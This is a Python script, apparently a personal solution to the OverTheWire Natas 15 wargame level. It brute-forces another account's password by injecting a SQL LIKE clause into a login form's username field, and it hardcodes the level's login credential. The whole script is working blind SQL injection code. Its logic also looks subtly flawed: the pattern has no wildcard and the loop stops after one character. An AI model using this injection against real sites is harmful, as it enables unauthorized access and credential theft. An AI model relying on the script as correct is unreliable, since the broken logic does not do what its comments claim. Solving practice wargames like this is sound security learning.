# -*- coding: utf-8 -*-
"""
Created on Mon Oct 30 14:19:35 2023

OverTheWire: Natas 15 ~ Abusing SQL's LIKE operator with bruteforce

@author: Diogo Barros
"""

import requests
from bs4 import BeautifulSoup 
import re

#Characters to loop through 
characters = [chr(i) for i in range(32, 126)]
a=iter(characters)

#POST request data
user='natas15'
password='TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url="http://natas15.natas.labs.overthewire.org/"


#Looping through each of the unicode characters 
for i in characters:
    data={"username":"natas16\" AND password like \"%s\" #" %i}
    myPost = requests.post(url,
                       auth=requests.auth.HTTPBasicAuth(user, password),
                       data=data)

    soup = BeautifulSoup(myPost.content, 'html5lib')
    a=soup.find('div', attrs={'id':'content'})
    b=re.split(r'<br|\n', str(a))[1]

    #len=24
    if(len(b) !=24):
        print("THIS IS DA LETTER: " + i)     
        break 







